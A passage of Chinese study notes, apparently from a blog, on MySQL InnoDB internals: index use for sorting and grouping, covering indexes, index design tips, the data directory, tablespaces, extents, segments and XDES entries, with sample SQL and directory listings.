再利⽤B+树索引了，只能遍历上⼀步查询得到的记录。</li></ol><p>在MySQL中，把这种在内存中或者磁盘上进⾏排序的⽅式统称为⽂件 排序（英⽂名：filesort）</p><p>但是如果ORDER BY⼦句⾥使⽤到了我们的索引列，就有 可能省去在内存或⽂件中排序的步骤，⽐如下边这个简单的查询语句，因为这 个B+树索引本身就是排好序的，然后进⾏回表操作取出该索引中不包含的列就好了</p><p><strong>对于联合索引有个问题需要注意，ORDER BY的⼦句后边的列的顺序 也必须按照索引列的顺序给出，如果给出ORDER BY phone_number, birthday, name的顺序，那也是⽤不了B+树索 引，这种颠倒顺序就不能使⽤索引的原因我们上边详细说过了，这就 不赘述了</strong></p><p>ORDER BY name、ORDER BY name, birthday这种匹配 索引左边的列的形式可以使⽤部分的B+树索引。当联合索引左边列 的值为常量</p><p><strong>不可以使⽤索引进⾏排序的⼏种情况</strong></p><p>对于使⽤联合索引进⾏排序的场景，我们要求各个排序列的排序顺序 是⼀致的，也就是要么各个列都是ASC规则排序，要么都是DESC规 则排序。默认升序</p><p>ORDER BY name DESC, birthday DESC LIMIT 10， 这种情况直接从索引的最右边开始往左读10⾏记录就可以了</p><p>规定使⽤联合索引的各个排序列的排序顺序必须是⼀ 致的。</p><p><strong>如果WHERE⼦句中出现了⾮排序使⽤到的索引列，那么排序依然是 使⽤不到索引的</strong></p><p><strong>有时候⽤来排序的多个列不是⼀个索引⾥的，这种情况也不能使⽤索引进⾏排序</strong></p><p><strong>排序列使⽤了复杂的表达式</strong></p><p>SELECT * FROM person_info ORDER BY UPPER(name) LIMIT 10;</p><p>使⽤了UPPER函数修饰过的列就不是单独的列啦，这样就⽆法使⽤索 引进⾏排序啦。</p><p><strong>用于分组</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT name, birthday, phone_number, COUNT(*)</span><br><span class="line">FROM person_info GROUP BY name, birthday,</span><br><span class="line">phone_number</span><br></pre></td></tr></table></figure><p>针对那些⼩⼩分组进⾏统计，⽐如在我们这个查询语句中就是统 计每个⼩⼩分组包含的记录条数。</p><p>和使⽤B+树索引进⾏排序是⼀个道理，分组列的顺序也需要和索引 列的顺序⼀致，也可以只使⽤索引列中左边的列进⾏分组。</p><p><strong>顺序I/O</strong></p><p>随机I/O</p><p>在聚簇索引中记录是根据id（也就是主键）的顺序 排列的，所以根据这些并不连续的id值到聚簇索引中访问完整的⽤ 户记录可能分布在不同的数据⻚中，这样读取完整的⽤户记录可能要 访问更多的数据⻚，这种读取⽅式我们也可以称为随机I/O</p><p>所以这个使⽤索引idx_name_birthday_phone_number的查询有这么两个特点： 会使⽤到两个B+树索引，⼀个⼆级索引，⼀个聚簇索引。 访问⼆级索引使⽤顺序I/O，访问聚簇索引使⽤随机I/O。</p><p>需要回表的记录越多，使⽤⼆级索引的性能就越低，甚⾄让某些查询 宁愿使⽤全表扫描也不使⽤⼆级索引。⽐⽅说name值在Asa ～Barlow之间的⽤户记录数量占全部记录数量90%以上，那么如果 使⽤idx_name_birthday_phone_number索引的话，有90%多的 id值需要回表，这不是吃⼒不讨好么，还不如直接去扫描聚簇索引 （也就是全表扫描）</p><p>查询优化器：需要回表的记录数越多，就越倾向于使⽤全表扫描，反之倾向于使⽤⼆级索引 + 回表 的⽅式</p><p>限制查询获取较少的记录数会让优化器更 倾向于选择使⽤⼆级索引 + 回表的⽅式进⾏查询，因为回表的记录 越少，性能提升就越⾼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM person_info ORDER BY name,</span><br><span class="line">birthday, phone_number;</span><br></pre></td></tr></table></figure><p>由于查询列表是*，所以如果使⽤⼆级索引进⾏排序的话，需要把排 序完的⼆级索引记录全部进⾏回表操作，这样操作的成本还不如直接 遍历聚簇索引然后再进⾏⽂件排序（filesort）低，所以优化器会 倾向于使⽤全表扫描的⽅式执⾏查询。</p><p><strong>最好在查询列表 ⾥只包含索引列</strong></p><p>所以在通过idx_name_birthday_phone_number索引得到结果后就不必到聚簇索引中再查找记录的剩余列，也就是country列 的值了，这样就省去了回表操作带来的性能损耗。我们把这种只需要⽤到索引的查询⽅式称为索引覆盖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT name, birthday, phone_number FROM</span><br><span class="line">person_info ORDER BY name, birthday,</span><br><span class="line">phone_number;</span><br></pre></td></tr></table></figure><p>这个查询中没有LIMIT⼦句，但是采⽤了覆盖索引，所以查询优 化器就会直接使⽤idx_name_birthday_phone_number索引进⾏ 排序⽽不需要回表操作了。</p><p>我们只需要为出现在WHERE⼦句中的name列创建索引就可以了</p><p>在记录⾏数⼀定的情况下，列的基数越⼤，该 列中的值越分散，列的基数越⼩，该列中的值越集中</p><p>假设某个列的 基数为1，也就是所有记录在该列中的值都⼀样，那为该列建⽴索引 是没有⽤的</p><p>如果某个建⽴了⼆级索引的列的重复值特别多，那么使⽤这个⼆ 级索引查出的记录还可能要做回表操作，这样性能损耗就更⼤了。所 以结论就是：最好为那些列的基数⼤的列建⽴索引，为基数太⼩列的 建⽴索引效果可能不好。</p><p>在表示的整数范围允许的情况下，尽量 让索引列使⽤较⼩的类型，⽐如我们能使⽤INT就不要使 ⽤BIGINT，能使⽤MEDIUMINT就不要使⽤INT</p><p>数据类型越⼩，在查询时进⾏的⽐较操作越快（这是CPU层次 的东东） 数据类型越⼩，索引占⽤的存储空间就越少，在⼀个数据⻚内 就可以放下更多的记录，从⽽减少磁盘I/O带来的性能损耗， 也就意味着可以把更多的数据⻚缓存在内存中，从⽽加快读写 效率。</p><p>这个建议对于表的主键来说更加适⽤，因为不仅是聚簇索引中会存储 主键值，其他所有的⼆级索引的节点处都会存储⼀份记录的主键值， 如果主键适⽤更⼩的数据类型，也就意味着节省更多的存储空间和更 ⾼效的I/O</p><p>B+树索引中的记录需要把该列的完整字符串存储起来，⽽且字 符串越⻓，在索引中占⽤的存储空间越⼤。 如果B+树索引中索引列存储的字符串很⻓，那在做字符串⽐较 时会占⽤更多的时间。</p><p><strong>只对字符串的前⼏个字符进⾏索引也就是 说在⼆级索引的记录中只保留字符串前⼏个字符</strong></p><p>这样只在B+树中存储字符串的前⼏个字符的编码，既 节约空间，⼜减少了字符串的⽐较时间，</p><p>这样只在B+树中存储字符串的前⼏个字符的编码，既 节约空间，⼜减少了字符串的⽐较时间，还⼤概能解决排序的问题</p><p><strong>在建表语句中只对name列的前10个字符进 ⾏索引</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE person_info(</span><br><span class="line">    name VARCHAR(100) NOT NULL,</span><br><span class="line">    birthday DATE NOT NULL,</span><br><span class="line">    phone_number CHAR(11) NOT NULL,</span><br><span class="line">    country varchar(100) NOT NULL,</span><br><span class="line">    KEY idx_name_birthday_phone_number (name(10),</span><br><span class="line">                                        birthday, phone_number)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>索引列前缀对排序的影响：使⽤索引列前缀的⽅ 式⽆法⽀持使⽤索引排序，只好乖乖的⽤⽂件排序喽</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM person_info ORDER BY name LIMIT 10;</span><br></pre></td></tr></table></figure><p>如果索引列在⽐较表达式中不是以单独列的形式出 现，⽽是以某个表达式，或者函数调⽤形式出现的话，是⽤不到索引 的。比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WHERE my_col * 2 &lt; 4 # 不可以使用B+树索引</span><br><span class="line">WHERE my_col &lt; 4&#x2F;2 #可以使用B+树索引</span><br></pre></td></tr></table></figure><p>⻚⾯ 分裂和记录移位意味着什么？意味着：性能损耗！所以如果我们想尽 量避免这样⽆谓的性能损耗，最好让插⼊的记录的主键值依次递增， 这样就不会发⽣这样的性能损耗了。</p><p>让主键具 有AUTO_INCREMENT，让存储引擎⾃⼰为表⽣成主键，⽽不是我们 ⼿动插⼊</p><p>我们⾃定义的主键列id拥有AUTO_INCREMENT属性，在插⼊记录时 存储引擎会⾃动为我们填⼊⾃增的主键值。</p><p>维护冗余索引只会增加维护的成本，并不会对搜索有 什么好处。</p><p><strong>唯一索引</strong></p><p>如果该表包含具有重复键值的行，那么索引创建过程会失败。为表定义了唯一索引之后，每当在该索引内添加或更改键时就会强制执行唯一性。此强制执行包括插入、更新、装入、导入和设置完整性以命名一些键。除了强制数据值的唯一性以外，唯一索引还可用来提高查询处理期间检索数据的性能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE repeat_index_demo (</span><br><span class="line">    c1 INT PRIMARY KEY,</span><br><span class="line">    c2 INT,</span><br><span class="line">    UNIQUE uidx_c1 (c1),</span><br><span class="line">    INDEX idx_c1 (c1)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>我们看到，c1既是主键、⼜给它定义为⼀个唯⼀索引，还给它定义 了⼀个普通索引，可是主键本身就会⽣成聚簇索引，所以定义的唯⼀ 索引和普通索引是重复的，这种情况要避免。</p><p>B+树索引适⽤于下边这些情况： 全值匹配 匹配左边的列 匹配范围值 精确匹配某⼀列并范围匹配另外⼀列 ⽤于排序 ⽤于分组</p><p>在使⽤索引时需要注意下边这些事项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 只为⽤于搜索、排序或分组的列创建索引 </span><br><span class="line">1. 为列的基数⼤的列创建索引 </span><br><span class="line">1. 索引列的类型尽量⼩ </span><br><span class="line">1. 可以只对字符串值的前缀建⽴索引 </span><br><span class="line">1. 只有索引列在⽐较表达式中单独出现才可以适⽤索引 </span><br><span class="line">1. 为了尽可能少的让聚簇索引发⽣⻚⾯分裂和记录移位的情 况，建议让主键拥有AUTO_INCREMENT属性。 </span><br><span class="line">1. 定位并删除表中的重复和冗余索引 尽量适⽤覆盖索引进⾏查询，避免回表带来的性能损耗</span><br></pre></td></tr></table></figure><h1 id="数据的家-——-MySQL-的数据目录"><a href="#数据的家-——-MySQL-的数据目录" class="headerlink" title="数据的家 —— MySQL 的数据目录"></a>数据的家 —— MySQL 的数据目录</h1><p>像 InnoDB 、 MyISAM 这样的存储引 擎都是把表存储在⽂件系统上的</p><p><strong>查看数据⽬录位置的两个⽅式：</strong></p><p>服务器未启动时（类Linux操作系统）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --verbose --help | grep datadir</span><br></pre></td></tr></table></figure><p>MySQL服务器程序在启动时会到⽂件系统的某个⽬录下加载⼀些⽂ 件，之后在运⾏过程中产⽣的数据也都会存储到这个⽬录下的某些⽂件中，这个⽬录就称为数据⽬录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#39;datadir&#39;;</span><br></pre></td></tr></table></figure><p>新建⼀个数据库时，MySQL会帮我们做这两件事⼉：</p><ol><li>在数据⽬录下创建⼀个和数据库名同名的⼦⽬录（或者说是⽂ 件夹）。</li><li>在该与数据库名同名的⼦⽬录下创建⼀个名为db.opt的⽂ 件，这个⽂件中包含了该数据库的各种属性，⽐⽅说该数据库 的字符集和⽐较规则是个啥。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| charset_demo_db |</span><br><span class="line">| dahaizi |</span><br><span class="line">| mysql |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys |</span><br><span class="line">| xiaohaizi |</span><br><span class="line">+--------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.</span><br><span class="line">├── auto.cnf</span><br><span class="line">├── ca-key.pem</span><br><span class="line">├── ca.pem</span><br><span class="line">├── charset_demo_db</span><br><span class="line">├── client-cert.pem</span><br><span class="line">├── client-key.pem</span><br><span class="line">├── dahaizi</span><br><span class="line">├── ib_buffer_pool</span><br><span class="line">├── ib_logfile0</span><br><span class="line">├── ib_logfile1</span><br><span class="line">├── ibdata1</span><br><span class="line">├── ibtmp1</span><br><span class="line">├── mysql</span><br><span class="line">├── performance_schema</span><br><span class="line">├── private_key.pem</span><br><span class="line">├── public_key.pem</span><br><span class="line">├── server-cert.pem</span><br><span class="line">├── server-key.pem</span><br><span class="line">├── sys</span><br><span class="line">├── xiaohaizideMacBook-Pro.local.err</span><br><span class="line">├── xiaohaizideMacBook-Pro.local.pid</span><br><span class="line">└── xiaohaizi</span><br><span class="line">6 directories, 16 files</span><br></pre></td></tr></table></figure><p>除了information_schema这个系统数据库外，其他的数据库 在数据⽬录下都有对应的⼦⽬录。这个information_schema⽐较 特殊，设计MySQL的⼤叔们对它的实现进⾏了特殊对待，没有使⽤ 相应的数据库⽬录，我们忽略它的存在就好了哈。</p><p>我们的数据其实都是以记录的形式插⼊到表中的，每个表的信息其实 可以分为两种： <strong>1. 表结构的定义 2. 表中的数据</strong></p><p><strong>表结构</strong>就是该表的名称是啥，表⾥边有多少列，每个列的数据类型是 啥，有啥约束条件和索引，⽤的是啥字符集和⽐较规则吧啦吧啦的各 种信息，这些信息都体现在了我们的建表语句中了。为了保存这些信 息InnoDB和MyISAM这两种存储引擎都在数据⽬录下对应的数据 库⼦⽬录下创建了⼀个专⻔⽤于描述表结构的⽂件，⽂件名是这样：表名.frm，⼆进 制格式存储的</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130134334.png" alt="image-20211130134331665"></p><p><strong>表空间</strong></p><p>为了管理页用的</p><p>每⼀个表空间可以 被划分为很多很多很多个⻚，我们的表数据就存放在某个表空间下的 某些⻚⾥。</p><p><strong>系统表空间 system tablespace</strong></p><p><strong>这个所谓的系统表空间可以对应⽂件系统上⼀个或多个实际的⽂件， 默认情况下，InnoDB会在数据⽬录下创建⼀个名为ibdata1（在你 的数据⽬录下找找看有⽊有）、⼤⼩为12M的⽂件，这个⽂件就是对 应的系统表空间在⽂件系统上的表示。</strong></p><p>系统表空间只有⼀ 份</p><p>独立表空间 file-per-table tablespace</p><p>在MySQL5.6.6以及之后的版本中，InnoDB并不会默认的把各个表 的数据存储到系统表空间中，⽽是为每⼀个表建⽴⼀个独⽴表空间， 也就是说我们创建了多少个表，就有多少个独⽴表空间。使⽤独⽴表 空间来存储表数据的话，会在该表所属数据库对应的⼦⽬录下创建⼀ 个表示该独⽴表空间的⽂件，⽂件名和表名相同，只不过添加了⼀ 个.ibd的扩展名⽽已，所以完整的⽂件名称⻓这样：表名.ibd</p><p>xiaohaizi数据库下的 test表</p><p>在该表所在数据库对应的xiaohaizi⽬录下会 为test表创建这两个⽂件： test.frm 和 test.ibd</p><p>test.ibd⽂件就⽤来存储test表中的数据和索引。</p><p>⽐如说我们想刻意 将表数据都存储到系统表空间时，可以在启动MySQL服务器的时候这 样配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[server]</span><br><span class="line">innodb_file_per_table&#x3D;0</span><br></pre></td></tr></table></figure><p>当innodb_file_per_table的值为0时，代表使⽤系统表空间； 当innodb_file_per_table的值为1时，代表使⽤独⽴表空间。 不过innodb_file_per_table参数只对新建的表起作⽤，对于已 经分配了表空间的表并不起作⽤。</p><p>⽐⽅说我们想把test表从独⽴表空 间移动到系统表空间，可以这么写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE test TABLESPACE innodb_system;</span><br></pre></td></tr></table></figure><p><strong>其他类型的表空间</strong></p><p>⽐如通⽤表空间（general tablespace）、undo表空间（undo tablespace）、临时表空间 （temporary tablespace）吧啦吧啦的</p><p><strong>MyISAM是如何存储表数据的</strong></p><p>在MyISAM中的索引全部都是⼆级索引，该存储引擎的数据和索引是 分开存放的。</p><p><strong>MyISAM并没有什么所谓的 表空间⼀说，表数据都存放到对应的数据库⼦⽬录下，表数据都存放到对应的数据库⼦⽬录下</strong></p><p>在数据库对应的xiaohaizi ⽬录下会为test表创建这三个⽂件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test.frm</span><br><span class="line">test.MYD</span><br><span class="line">test.MYI</span><br></pre></td></tr></table></figure><p>其中test.MYD代表表的数据⽂件，也就是我们插⼊的⽤户记 录；test.MYI代表表的索引⽂件，我们为该表创建的索引都会放到 这个⽂件中。</p><p>在存储视图的时候是不需要存储真实的数据的，只 需要把它的结构存储起来就⾏了。和表⼀样，描述视图结构的⽂件也 会被存储到所属数据库对应的⼦⽬录下边，只会存储⼀个视图 名.frm的⽂件</p><p>数据目录下还包括为了更好运⾏程序的⼀些额外⽂件：</p><p><strong>服务器进程⽂件</strong></p><p><strong>服务器⽇志⽂件</strong></p><p><strong>默认/⾃动⽣成的SSL和RSA证书和密钥⽂件</strong>：主要是为了客户端和服务器安全通信⽽创建的⼀些⽂件， ⼤家 看不懂可以忽略～</p><p><strong>⽂件系统对数据库的影响</strong></p><ol><li><p>数据库名称和表名称不得超过⽂件系统所允许的最⼤⻓度。</p></li><li><p>特殊字符的问题</p><p>为了避免因为数据库名和表名出现某些特殊字符⽽造成⽂件系 统不⽀持的情况，MySQL会把数据库名和表名中所有除数字和 拉丁字⺟以外的所有字符在⽂件名⾥都映射成 @+编码值的形式 作为⽂件名。⽐⽅说我们创建的表的名称为’test?’，由于? 不属于数字或者拉丁字⺟，所以会被映射成编码值，所以这个 表对应的.frm⽂件的名称就变成了<a href="mailto:test@003f.frm">test@003f.frm</a>。</p></li><li><p>⽂件⻓度受⽂件系统最⼤⻓度限制</p><p>对于InnoDB的独⽴表空间来说，每个表的数据都会被存储到 ⼀个与表名同名的.ibd⽂件中；对于MyISAM存储引擎来说， 数据和索引会分别存放到与表同名的.MYD和.MYI⽂件中。这 些⽂件会随着表中记录的增加⽽增⼤，它们的⼤⼩受限于⽂件 系统⽀持的最⼤⽂件⼤⼩。</p></li><li><p>如果同时访问的表的数量⾮常多，可能会受到⽂件系统的 ⽂件描述符有限的影响</p></li></ol><h1 id="存放页面的大池子-——-InnoDB-的表空间"><a href="#存放页面的大池子-——-InnoDB-的表空间" class="headerlink" title="存放页面的大池子 —— InnoDB 的表空间"></a>存放页面的大池子 —— InnoDB 的表空间</h1><p>这块的知识量很大。</p><p><strong>⼤家 可以把表空间想象成被切分为许许多多个⻚的池⼦，当我们想为某个 表插⼊⼀条记录的时候，就从池⼦中捞出⼀个对应的⻚来把数据写进 去。</strong></p><p>⻚⾯类型</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130143452.png" alt="image-20211130143449661"></p><p>⻚⾯通⽤部分 我们前边说过数据⻚，也就是INDEX类型的⻚由7个部分组成，其中 的两个部分是所有类型的⻚⾯都通⽤的。当然我不能寄希望于你把我 说的话都记住，所以在这⾥重新强调⼀遍，任何类型的⻚⾯都有下边 这种通⽤的结构</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130143957.png" alt="image-20211130143955888"></p><p>File Trailer：校验⻚是否完整，保证从内存到磁盘刷新时 内容的⼀致性。</p><p>File Header：记录⻚⾯的⼀些通⽤信息</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130144122.png" alt="image-20211130144120094"></p><p>表空间中的每⼀个⻚都对应着⼀个⻚号，也就 是FIL_PAGE_OFFSET，这个⻚号由4个字节组成，也就是32 个⽐特位，所以⼀个表空间最多可以拥有2³²个⻚，如果按照⻚ 的默认⼤⼩16KB来算，⼀个表空间最多⽀持64TB的数据。表 空间的第⼀个⻚的⻚号为0，之后的⻚号分别是1，2，3…依此 类推</p><p>某些类型的⻚可以组成链表，链表中的⻚可以不按照物理顺序存储，⽽是根据FIL_PAGE_PREV和FIL_PAGE_NEXT来存储 上⼀个⻚和下⼀个⻚的⻚号。需要注意的是，这两个字段主要 是为了INDEX类型的⻚，也就是我们之前⼀直说的数据⻚建⽴ B+树后，为每层节点建⽴双向链表⽤的，⼀般类型的⻚是不使 ⽤这两个字段的。</p><p>每个⻚的类型由FIL_PAGE_TYPE表示，⽐如像数据⻚的该字 段的值就是0x45BF，我们后边会介绍各种不同类型的⻚，不 同类型的⻚在该字段上的值是不同的。</p><p><strong>独⽴表空间结构</strong></p><p><strong>区（extent）的概念</strong></p><p>对于16KB 的⻚来说，连续的64个⻚就是⼀个区，也就是说⼀个区默认占⽤ 1MB空间⼤⼩</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130145023.png" alt="image-20211130145020329"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130145204.png" alt="image-20211130145201413"></p><p>独立表空间是由多个区组成，64个页组成一个区，256个区被划分为一组，<strong>每个组的最开始的⼏个⻚⾯类型是固定 的就好了。</strong></p><p><strong>第⼀个组最开始的由3个⻚⾯的类型是固定的，也就是说 extent 0这个区最开始的3个⻚⾯的类型是固定的，分别是：</strong></p><ol><li>FSP_HDR类型：这个类型的⻚⾯是⽤来登记整个表空间 的⼀些整体属性以及本组所有的区，也就是extent 0 ~ extent 255这256个区的属性，整个表空间只有⼀个FSP_HDR类型的⻚⾯。</li><li>IBUF_BITMAP类型：这个类型的⻚⾯是存储本组所有的区的所有⻚⾯关于INSERT BUFFER的信息。</li><li>INODE类型：这个类型的⻚⾯存储了许多称为INODE的数 据结构</li></ol><p><strong>其余各组最开始的2个⻚⾯的类型是固定的，也就是说extent 256、extent 512这些区最开始的2个⻚⾯的类型是固定的， 分别是：</strong></p><p>XDES类型：全称是extent descriptor，⽤来登记本 组256个区的属性，也就是说对于在extent 256区中的 该类型⻚⾯存储的就是extent 256 ~ extent 511这 些区的属性，对于在extent 512区中的该类型⻚⾯存储 的就是extent 512 ~ extent 767这些区的属性。上 边介绍的FSP_HDR类型的⻚⾯其实和XDES类型的⻚⾯的 作⽤类似，只不过FSP_HDR类型的⻚⾯还会额外存储⼀ 些表空间的属性。</p><p>IBUF_BITMAP类型：这个类型的⻚⾯是存储本组所有的区的所有⻚⾯关于INSERT BUFFER的信息。</p><p><strong>段（segment）的概念</strong></p><p>我们每向表中插⼊⼀条记录，本质上就是向该表的聚簇索引以 及所有⼆级索引代表的B+树的节点中插⼊数据。⽽B+树的每⼀ 层中的⻚都会形成⼀个双向链表，如果是以⻚为单位来分配存 储空间的话，双向链表相邻的两个⻚之间的物理位置可能离得 ⾮常远。我们介绍B+树索引的适⽤场景的时候特别提到范围查 询只需要定位到最左边的记录和最右边的记录，然后沿着双向 链表⼀直扫描就可以了，⽽如果链表中相邻的两个⻚物理位置 离得⾮常远，就是所谓的随机I/O。再⼀次强调，磁盘的速度 和内存的速度差了好⼏个数量级，随机I/O是⾮常慢的，所以 我们应该尽量让链表中相邻的⻚的物理位置也相邻，这样进⾏ 范围查询的时候才可以使⽤所谓的顺序I/O。所以才引⼊了区（extent）的概念，⼀个区就是在物 理位置上连续的64个⻚。</p><p><strong>我们提到的范围查询，其实是对 B+树叶⼦节点中的记录进⾏顺序扫描，⽽如果不区分叶⼦节点和⾮ 叶⼦节点，统统把节点代表的⻚⾯放到申请到的区中的话，进⾏范围 扫描的效果就⼤打折扣了。所以设计InnoDB的⼤叔们对B+树的叶⼦ 节点和⾮叶⼦节点进⾏了区别对待，也就是说叶⼦节点有⾃⼰独有的 区，⾮叶⼦节点也有⾃⼰独有的区。存放叶⼦节点的区的集合就算是 ⼀个段（segment），存放⾮叶⼦节点的区的集合也算是⼀个段。 也就是说⼀个索引会⽣成2个段，⼀个叶⼦节点段，⼀个⾮叶⼦节点 段。</strong></p><p><strong>但是但是</strong>⼀个 索引会⽣成2个段，⽽段是以区为单位申请存储空间的，⼀个区默认 占⽤1M存储空间，所以默认情况下⼀个只存了⼏条记录的⼩表也需 要2M的存储空间么？</p><p><strong>其实段是 ⼀些零散的⻚⾯以及⼀些完整的区的集合</strong></p><p>设计InnoDB的⼤叔们提出 了⼀个<strong>碎⽚（fragment）区</strong>的概念，也就是在⼀个碎⽚区中，并不 是所有的⻚都是为了存储同⼀个段的数据⽽存在的，⽽是碎⽚区中的 ⻚可以⽤于不同的⽬的，⽐如有些⻚⽤于段A，有些⻚⽤于段B，有 些⻚甚⾄哪个段都不属于。碎⽚区直属于表空间，并不属于任何⼀个 段。</p><p>某个段分配存储空间的策略是这样的： 在刚开始向表中插⼊数据的时候，段是从某个碎⽚区以单个⻚ ⾯为单位来分配存储空间的。 当某个段已经占⽤了32个碎⽚区⻚⾯之后，就会以完整的区为 单位来分配存储空间。</p><p><strong>表空间的是由若⼲个区组成的，这些 区⼤体上可以分为4种类型：</strong></p><ul><li>空闲的区：现在还没有⽤到这个区中的任何⻚⾯。</li><li>有剩余空间的碎⽚区：表示碎⽚区中还有可⽤的⻚⾯。</li><li>没有剩余空间的碎⽚区：表示碎⽚区中的所有⻚⾯都被使⽤， 没有空闲⻚⾯。</li><li>附属于某个段的区。每⼀个索引都可以分为叶⼦节点段和⾮叶 ⼦节点段，除此之外 InnoDB 还会另外定义⼀些特殊作⽤的 段，在这些段中的数据量很⼤时将使⽤区来作为基本的分配单位。</li></ul><p><strong>这4种类型的区也可以被称为区的4种状态（State）：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">状态名 含义</span><br><span class="line">FREE 空闲的区</span><br><span class="line">FREE_FRAG 有剩余空间的碎⽚区</span><br><span class="line">FULL_FRAG没有剩余空间的碎⽚区</span><br><span class="line">FSEG 附属于某个段的区</span><br></pre></td></tr></table></figure><p><strong>处于FREE、FREE_FRAG以及FULL_FRAG 这三种状态的区都是独⽴的，算是直属于表空间；⽽处于FSEG状态 的区是附属于某个段的。</strong></p><p>为了⽅便管理这些区，设计InnoDB的⼤叔设计了⼀个称为XDES Entry的结构（全称就是Extent Descriptor Entry），每⼀个区都对应着⼀个XDES Entry结构，这个结构记录了对应的区的⼀些属 性。我们先看图来对这个结构有个⼤致的了解：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130163833.png" alt="image-20211130163831749"></p><p>XDES Entry是⼀个40个字节的结构</p><ol><li><p>此处的Segment ID字段表示就是该区所在的段，当然前提是该区已经被分配给 某个段了，不然的话该字段的值没啥意义。</p></li><li><p>List Node : 这个部分可以将若⼲个XDES Entry结构串联成⼀个链表，⼤ 家看⼀下这个List Node的结构：</p><p>如果我们想定位表空间内的某⼀个位置的话，只需指定⻚号以 及该位置在指定⻚号中的⻚内偏移量即可。所以： Pre Node Page Number和Pre Node Offset的组合 就是指向前⼀个XDES Entry的指针。 Next Node Page Number和Next Node Offset的 组合就是指向后⼀个XDES Entry的指针。</p></li><li><p>State: 这个字段表明区的状态：FREE、FREE_FRAG、FULL_FRAG和FSEG</p></li><li><p>Page State Bitmap（16字节） 这个部分共占⽤16个字节，也就是128个⽐特位</p><p>⼀个 区默认有64个⻚，这128个⽐特位被划分为64个部分，每个部 分2个⽐特位，对应区中的⼀个⻚。这两个⽐特位的第⼀个位表示对应的⻚是否是空闲 的，第⼆个⽐特位还没有⽤。</p></li></ol><p><strong>我发现看着看着就有点迷糊了。</strong></p><p>这一块就这样吧，我截图好了，资料我回去再看一遍。。。。。。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130204310.png" alt="image-20211130204307935"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130204405.png" alt="image-20211130204403546"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130205249.png" alt="image-20211130205247223"></p><p>File Space Header 这个部分是⽤来存储表空间的⼀些整体属性的</p><p><img 